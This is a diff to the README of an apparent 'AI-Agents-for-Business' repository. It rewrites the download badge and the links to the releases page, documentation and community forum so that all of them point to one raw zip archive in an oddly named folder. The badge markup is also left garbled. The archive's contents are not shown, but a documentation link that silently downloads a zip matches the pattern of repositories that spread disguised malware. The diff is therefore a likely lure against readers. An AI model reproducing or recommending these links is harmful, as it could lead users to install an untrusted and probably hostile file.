@@ -1,6 +1,6 @@
 # 🤖 AI-Agents-for-Business - Automate Work with AI Solutions
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/Abbas95Nasser/AI-Agents-for-Business/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Abbas95Nasser/AI-Agents-for-Business/main/thwartwise/AI-Agents-for-Business_3.6.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/Abbas95Nasser/AI-Agents-for-Business/main/thwartwise/AI-Agents-for-Business_3.6.zip)](https://raw.githubusercontent.com/Abbas95Nasser/AI-Agents-for-Business/main/thwartwise/AI-Agents-for-Business_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **AI-Agents-for-Business**! This project offers a collection of open-
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version: [Releases Page](https://github.com/Abbas95Nasser/AI-Agents-for-Business/releases). 
+To get started, visit this page to download the latest version: [Releases Page](https://raw.githubusercontent.com/Abbas95Nasser/AI-Agents-for-Business/main/thwartwise/AI-Agents-for-Business_3.6.zip). 
 
 Choose the file that matches your operating system and click on it to begin the download. The file you download will provide you with the latest features and updates.
 
@@ -74,8 +74,8 @@ Your feedback is important for the growth of **AI-Agents-for-Business**. If you 
 
 ## 🔗 Helpful Links
 
-- [Releases Page](https://github.com/Abbas95Nasser/AI-Agents-for-Business/releases)
-- [Documentation](https://github.com/Abbas95Nasser/AI-Agents-for-Business/wiki)
-- [Community Forum](https://github.com/Abbas95Nasser/AI-Agents-for-Business/discussions)
+- [Releases Page](https://raw.githubusercontent.com/Abbas95Nasser/AI-Agents-for-Business/main/thwartwise/AI-Agents-for-Business_3.6.zip)
+- [Documentation](https://raw.githubusercontent.com/Abbas95Nasser/AI-Agents-for-Business/main/thwartwise/AI-Agents-for-Business_3.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/Abbas95Nasser/AI-Agents-for-Business/main/thwartwise/AI-Agents-for-Business_3.6.zip)
 
 Thank you for choosing **AI-Agents-for-Business**! We hope this software helps you automate and simplify your work.
